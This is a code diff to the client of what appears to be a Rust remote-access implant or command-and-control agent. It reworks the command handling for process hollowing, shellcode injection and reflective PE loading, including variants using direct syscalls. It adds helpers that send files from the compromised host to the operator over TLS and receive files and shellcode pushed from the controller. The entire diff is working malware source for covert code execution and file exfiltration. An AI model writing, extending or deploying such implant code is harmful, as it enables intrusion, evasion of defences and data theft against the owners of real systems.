@@ -3,6 +3,7 @@ use crate::loader::{reflective_loader, remote_loader, shellcode_loader};
 use crate::loader_syscalls::{
     reflective_loader_syscalls, remote_loader_syscalls, shellcode_loader_syscalls,
 };
+use crate::utils::tools::{read_and_send_file, receive_and_write_bytes};
 
 use std::error::Error;
 use std::fs::File;
@@ -28,7 +29,30 @@ fn do_stuff(cmd: &str) -> Vec<u8> {
     }
 }
 
-fn call_loader(file_to_load: &str, pe_to_exec: &str, loader: u8) -> Result<(), Box<dyn Error>> {
+fn call_loader_shellcode(
+    shellcode_to_load: Vec<u8>,
+    pe_to_exec: &str,
+    loader: u8,
+) -> Result<(), Box<dyn Error>> {
+    match loader {
+        0 => match shellcode_loader_syscalls(shellcode_to_load, pe_to_exec) {
+            Ok(rl) => rl,
+            Err(_) => {
+                return Err("Shellcode loading error".into());
+            }
+        },
+        1 => match shellcode_loader(shellcode_to_load, pe_to_exec) {
+            Ok(rl) => rl,
+            Err(_) => {
+                return Err("Shellcode loading error".into());
+            }
+        },
+        _ => log::debug!("Invalid loader ID"),
+    }
+    Ok(())
+}
+
+fn call_loader_pe(file_to_load: &str, pe_to_exec: &str, loader: u8) -> Result<(), Box<dyn Error>> {
     let mut buf: Vec<u8> = Vec::new();
     let file = File::open(file_to_load.trim().replace("\\\\", "\\"));
     match file {
@@ -41,31 +65,19 @@ fn call_loader(file_to_load: &str, pe_to_exec: &str, loader: u8) -> Result<(), B
                         return Err("PE loading error".into());
                     }
                 },
-                1 => match shellcode_loader(buf, pe_to_exec) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("Shellcode loading error".into());
-                    }
-                },
-                2 => match remote_loader_syscalls(buf, pe_to_exec) {
+                1 => match remote_loader_syscalls(buf, pe_to_exec) {
                     Ok(rl) => rl,
                     Err(_) => {
                         return Err("PE loading error".into());
                     }
                 },
-                3 => match shellcode_loader_syscalls(buf, pe_to_exec) {
-                    Ok(rl) => rl,
-                    Err(_) => {
-                        return Err("Shellcode loading error".into());
-                    }
-                },
-                4 => match reflective_loader(buf) {
+                2 => match reflective_loader(buf) {
                     Ok(rl) => rl,
                     Err(_) => {
                         return Err("PE loading error".into());
                     }
                 },
-                5 => match reflective_loader_syscalls(buf) {
+                3 => match reflective_loader_syscalls(buf) {
                     Ok(rl) => rl,
                     Err(_) => {
                         return Err("PE loading error".into());
@@ -142,19 +154,14 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
             let cmd = tmp + String::from_utf8_lossy(&buff[..bytes_read]).trim_end_matches('\0');
             let path: Vec<&str> = cmd.split(" ").collect();
             match File::open(path[1]) {
-                Ok(mut file) => {
-                    let mut file_buffer = [0; 4096];
-                    loop {
-                        let bytes_read = file.read(&mut file_buffer)?;
-                        if bytes_read == 0 {
-                            let end_of_file =
-                                "EndOfTheFile:".to_owned() + &file.metadata()?.len().to_string();
-                            tls_stream.write_all(end_of_file.as_bytes())?;
-                            break;
-                        }
-                        tls_stream.write_all(&file_buffer[..bytes_read])?;
+                Ok(file) => match read_and_send_file(file, &mut tls_stream) {
+                    Ok(_) => (),
+                    Err(r) => {
+                        log::error!("Error during upload : {}", r);
+                        tls_stream.flush().unwrap();
+                        continue;
                     }
-                }
+                },
                 Err(r) => {
                     tls_stream.write(r.to_string().as_bytes())?;
                     tls_stream.write_all("EndOfTheFile".as_bytes())?;
@@ -171,37 +178,20 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                 Ok(mut file) => {
                     tls_stream.write("Creation OK".as_bytes())?;
                     let mut file_buffer = [0; 4096];
+                    let mut file_vec: Vec<u8> = Vec::new();
                     match tls_stream.read(&mut file_buffer) {
-                        Ok(_) => loop {
-                            if String::from_utf8_lossy(&file_buffer).starts_with("EndOfTheFile") {
-                                // Drop all the ending null bytes added by the buffer
-                                let file_len_string = String::from_utf8_lossy(&file_buffer)
-                                    .splitn(2, ':')
-                                    .nth(1)
-                                    .unwrap_or("0")
-                                    .trim_end_matches('\0')
-                                    .to_owned();
-                                let file_len_u64 = file_len_string.parse::<u64>();
-                                match file.set_len(file_len_u64.unwrap()) {
-                                    Ok(_) => (),
-                                    Err(r) => {
-                                        log::debug!("Error dropping the null bytes at the end of the file : {}", r);
-                                        continue;
-                                    }
-                                }
-                                break;
-                            } else {
-                                file.write(&file_buffer)?;
-                                file_buffer = [0; 4096];
-                                tls_stream.read(&mut file_buffer)?;
-                            }
-                        },
+                        Ok(_) => receive_and_write_bytes(
+                            &mut tls_stream,
+                            &mut file_vec,
+                            &mut file_buffer,
+                        )?,
                         Err(r) => {
                             log::debug!("Reading error : {}", r);
                             tls_stream.flush()?;
                             continue;
                         }
                     }
+                    file.write(&file_vec)?;
                 }
                 Err(r) => {
                     log::debug!("File creation error : {}", r);
@@ -216,10 +206,10 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
             .starts_with("load -h")
             || String::from_utf8_lossy(&buff)
                 .trim_end_matches('\0')
-                .starts_with("load -s")
+                .starts_with("syscalls -h")
             || String::from_utf8_lossy(&buff)
                 .trim_end_matches('\0')
-                .starts_with("syscalls -h")
+                .starts_with("load -s")
             || String::from_utf8_lossy(&buff)
                 .trim_end_matches('\0')
                 .starts_with("syscalls -s")
@@ -235,16 +225,9 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                     tls_stream.write("Invalid argument number. Usage is : load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow\0".as_bytes())?;
                 } else if String::from_utf8_lossy(&buff)
                     .trim_end_matches('\0')
-                    .starts_with("load -s")
-                {
-                    tls_stream.write("Invalid argument number. Usage is : load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute\0".as_bytes())?;
-                } else if String::from_utf8_lossy(&buff)
-                    .trim_end_matches('\0')
                     .starts_with("syscalls -h")
                 {
                     tls_stream.write("Invalid argument number. Usage is : syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow\0".as_bytes())?;
-                } else {
-                    tls_stream.write("Invalid argument number. Usage is : syscalls -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute\0".as_bytes())?;
                 }
             } else {
                 let load_ret: Result<(), Box<dyn Error>>;
@@ -252,36 +235,49 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                     .trim_end_matches('\0')
                     .starts_with("load -h")
                 {
-                    load_ret = call_loader(
+                    load_ret = call_loader_pe(
                         path[2].trim_end_matches('\0'),
                         path[3].trim_end_matches('\0'),
                         0,
                     );
                 } else if String::from_utf8_lossy(&buff)
                     .trim_end_matches('\0')
-                    .starts_with("load -s")
+                    .starts_with("syscalls -h")
                 {
-                    load_ret = call_loader(
+                    load_ret = call_loader_pe(
                         path[2].trim_end_matches('\0'),
                         path[3].trim_end_matches('\0'),
                         1,
                     );
-                } else if String::from_utf8_lossy(&buff)
-                    .trim_end_matches('\0')
-                    .starts_with("syscalls -h")
-                {
-                    load_ret = call_loader(
-                        path[2].trim_end_matches('\0'),
-                        path[3].trim_end_matches('\0'),
-                        2,
-                    );
                 } else {
-                    load_ret = call_loader(
-                        path[2].trim_end_matches('\0'),
-                        path[3].trim_end_matches('\0'),
-                        3,
-                    );
+                    let mut shellcode_buffer = [0; 4096];
+                    let mut shellcode_vec: Vec<u8> = Vec::new();
+                    match tls_stream.read(&mut shellcode_buffer) {
+                        Ok(_) => {
+                            receive_and_write_bytes(
+                                &mut tls_stream,
+                                &mut shellcode_vec,
+                                &mut shellcode_buffer,
+                            )?;
+                        }
+                        Err(r) => {
+                            log::debug!("Reading error : {}", r);
+                            tls_stream.flush()?;
+                            continue;
+                        }
+                    }
+                    if String::from_utf8_lossy(&buff)
+                        .trim_end_matches('\0')
+                        .starts_with("load -s")
+                    {
+                        load_ret =
+                            call_loader_shellcode(shellcode_vec, path[3].trim_end_matches('\0'), 0);
+                    } else {
+                        load_ret =
+                            call_loader_shellcode(shellcode_vec, path[3].trim_end_matches('\0'), 1);
+                    }
                 }
+
                 match load_ret {
                     Ok(()) => {
                         tls_stream.write("\0".as_bytes())?;
@@ -322,9 +318,9 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
                     .trim_end_matches('\0')
                     .starts_with("load")
                 {
-                    load_ret = call_loader(path[1].trim_end_matches('\0'), "", 4);
+                    load_ret = call_loader_pe(path[1].trim_end_matches('\0'), "", 2);
                 } else {
-                    load_ret = call_loader(path[1].trim_end_matches('\0'), "", 5);
+                    load_ret = call_loader_pe(path[1].trim_end_matches('\0'), "", 3);
                 }
                 match load_ret {
                     Ok(()) => {
